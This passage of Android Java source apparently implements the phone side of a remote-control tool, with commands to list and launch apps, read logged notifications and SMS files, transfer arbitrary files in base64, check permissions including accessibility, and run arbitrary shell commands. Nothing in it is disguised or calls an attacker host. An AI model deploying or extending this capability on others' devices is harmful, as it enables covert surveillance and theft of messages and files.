                        if (ids.length == 0) return "ERR torch: no camera";
                        cm.setTorchMode(ids[0], on);
                        return "OK torch " + (on ? "on" : "off");
                    } catch (Exception e) {
                        return "ERR torch: " + e;
                    }
                }
                case "vibrate": {
                    long ms = 500;
                    try { ms = Math.max(1, Math.min(10_000, Long.parseLong(arg.isEmpty() ? "500" : arg.trim()))); }
                    catch (NumberFormatException ignored) {}
                    try {
                        android.os.Vibrator v = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
                        v.vibrate(android.os.VibrationEffect.createOneShot(ms, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
                        return "OK vibrate " + ms + "ms";
                    } catch (Exception e) {
                        return "ERR vibrate: " + e;
                    }
                }
                case "apps": {
                    StringBuilder sb = new StringBuilder("OK ");
                    for (android.content.pm.PackageInfo pi : getPackageManager().getInstalledPackages(0))
                        sb.append(pi.packageName).append('\n');
                    return sb.toString();
                }
                case "startapp": {
                    if (arg.isEmpty()) return "ERR startapp: <package>";
                    try {
                        Intent i = getPackageManager().getLaunchIntentForPackage(arg.trim());
                        if (i == null) return "ERR startapp: no launch intent for " + arg;
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(i);
                        return "OK startapp " + arg + " (may be blocked from background)";
                    } catch (Exception e) {
                        return "ERR startapp: " + e;
                    }
                }
                case "notifs": {
                    int n = 20;
                    try { n = Math.max(1, Math.min(500, Integer.parseInt(arg.isEmpty() ? "20" : arg.trim()))); }
                    catch (NumberFormatException ignored) {}
                    File f = new File(getExternalFilesDir(null), "notifs.txt");
                    if (!f.isFile()) return "OK notifs: none yet (enable listener: androremote.py notifsenable)";
                    java.util.List<String> lines = Files.readAllLines(f.toPath(), StandardCharsets.UTF_8);
                    StringBuilder sb = new StringBuilder("OK ");
                    for (int i = Math.max(0, lines.size() - n); i < lines.size(); i++)
                        sb.append(lines.get(i)).append('\n');
                    return sb.toString();
                }

                case "getb64": {
                    // GETB64 <b64path> -> OK <len> <b64>
                    File f = new File(new String(b64(arg), StandardCharsets.UTF_8));
                    if (!f.isFile()) return "ERR getb64: no such file: " + f;
                    if (f.length() > 32L * 1024 * 1024) return "ERR getb64: too large";
                    return "OK " + f.length() + " " + java.util.Base64.getEncoder().encodeToString(Files.readAllBytes(f.toPath()));
                }
                case "putb64": {
                    // PUTB64 <b64path> <b64data>
                    int sp = arg.indexOf(' ');
                    if (sp < 0) return "ERR putb64: <b64path> <b64data>";
                    File f = new File(new String(b64(arg.substring(0, sp)), StandardCharsets.UTF_8));
                    if (f.getAbsolutePath().contains("..")) return "ERR putb64: bad path";
                    byte[] data = b64(arg.substring(sp + 1));
                    File parent = f.getParentFile();
                    if (parent != null) parent.mkdirs();
                    Files.write(f.toPath(), data);
                    return "OK putb64 " + data.length + " bytes " + f;
                }
                case "log": {
                    File logsDir = new File(getExternalFilesDir(null), "logs");
                    StringBuilder sb = new StringBuilder("OK ");
                    File[] files = logsDir.listFiles();
                    if (files == null || files.length == 0) return "OK no logs";
                    for (File f : files) sb.append(f.getName()).append('\n');
                    return sb.toString();
                }
                case "smslog": {
                    String name = arg.isEmpty() ? null : arg;
                    File logsDir = new File(getExternalFilesDir(null), "logs");
                    File[] files = logsDir.listFiles();
                    if (files == null) return "ERR smslog: no logs";
                    if (name != null) {
                        for (File f : files) {
                            if (f.getName().equals(name) || f.getName().startsWith("sms_" + name)) {
                                return "OK " + readText(f);
                            }
                        }
                        return "ERR smslog: not found: " + name;
                    }
                    StringBuilder sb = new StringBuilder("OK ");
                    for (File f : files) sb.append(f.getName()).append('\n');
                    return sb.toString();
                }
                case "perms": {
                    StringBuilder sb = new StringBuilder("OK ");
                    for (String p : MainActivity.ALL_PERMS) {
                        sb.append(p).append('=')
                          .append(checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED ? "granted" : "denied")
                          .append('\n');
                    }
                    sb.append("accessibility=").append(RemoteAccessibilityService.instance != null ? "enabled" : "disabled").append('\n');
                    sb.append("install_unknown=").append(
                            getPackageManager().canRequestPackageInstalls() ? "granted" : "denied").append('\n');
                    return sb.toString();
                }
                default: return "ERR unknown op " + op;
            }
        } catch (Exception e) {
            return "ERR " + e;
        }
    }

    private String requestPermission(String op, String... permissions) {
        for (String p : permissions) if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
            Intent i = new Intent(this, MainActivity.class);
            i.putExtra(MainActivity.PERMS_KEY, permissions);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(i);
            return "ERR " + op + ": permission dialog shown; approve and retry";
        }
        return null;
    }

    String shell(String command, long timeoutMs) throws Exception {
        Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
        StringBuilder out = new StringBuilder();
        StringBuilder err = new StringBuilder();
        Thread t1 = drain(p.getInputStream(), out);
        Thread t2 = drain(p.getErrorStream(), err);
        p.waitFor(timeoutMs, java.util.concurrent.TimeUnit.MILLISECONDS);
        t1.join(2000);
        t2.join(2000);
        p.destroyForcibly();
        String s = out.append(err).toString();
        return s.isEmpty() ? "OK" : s;
    }

    Thread drain(InputStream is, StringBuilder sb) {
        Thread t = new Thread(() -> {
            try (BufferedReader br = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8))) {
                String s;
                while ((s = br.readLine()) != null) sb.append(s).append('\n');
            } catch (Exception ignored) {}
        });
        t.setDaemon(true);
        t.start();
        return t;
    }

    void copyExactly(InputStream is, OutputStream os, long size) throws Exception {
        byte[] buf = new byte[8192];
        long total = 0;
        while (total < size) {
            int r = is.read(buf, 0, (int) Math.min(buf.length, size - total));
            if (r < 0) break;
            os.write(buf, 0, r);
            total += r;
        }
        if (total != size) throw new java.io.IOException("short read: " + total + "/" + size);
    }

    void writeFileRaw(File f, OutputStream os) throws Exception {
        try (FileInputStream fis = new FileInputStream(f)) {
            byte[] buf = new byte[8192];
            int r;
            while ((r = fis.read(buf)) > 0) os.write(buf, 0, r);
        }
    }

    String readText(File f) throws Exception {
        return new String(Files.readAllBytes(f.toPath()), StandardCharsets.UTF_8);
    }

    static byte[] b64(String s) {
        return java.util.Base64.getDecoder().decode(s);
    }

    static void writeWavHeader(File f, int rate, int channels, int bits, long dataLen) throws Exception {
        byte[] h = new byte[44];
        long totalLen = dataLen + 36;
        long byteRate = (long) rate * channels * bits / 8;
        h[0] = 'R'; h[1] = 'I'; h[2] = 'F'; h[3] = 'F';
        h[4] = (byte) totalLen; h[5] = (byte) (totalLen >> 8); h[6] = (byte) (totalLen >> 16); h[7] = (byte) (totalLen >> 24);
        h[8] = 'W'; h[9] = 'A'; h[10] = 'V'; h[11] = 'E';
        h[12] = 'f'; h[13] = 'm'; h[14] = 't'; h[15] = ' ';
        h[16] = 16; h[17] = 0; h[18] = 0; h[19] = 0;
        h[20] = 1; h[21] = 0; // PCM
        h[22] = (byte) channels; h[23] = 0;
        h[24] = (byte) rate; h[25] = (byte) (rate >> 8); h[26] = (byte) (rate >> 16); h[27] = (byte) (rate >> 24);
        h[28] = (byte) byteRate; h[29] = (byte) (byteRate >> 8); h[30] = (byte) (byteRate >> 16); h[31] = (byte) (byteRate >> 24);
        h[32] = (byte) (channels * bits / 8); h[33] = 0;
        h[34] = (byte) bits; h[35] = 0;
        h[36] = 'd'; h[37] = 'a'; h[38] = 't'; h[39] = 'a';
        h[40] = (byte) dataLen; h[41] = (byte) (dataLen >> 8); h[42] = (byte) (dataLen >> 16); h[43] = (byte) (dataLen >> 24);
        try (RandomAccessFile raf = new RandomAccessFile(f, "rw")) {
            raf.seek(0);
            raf.write(h);
        }
    }
}
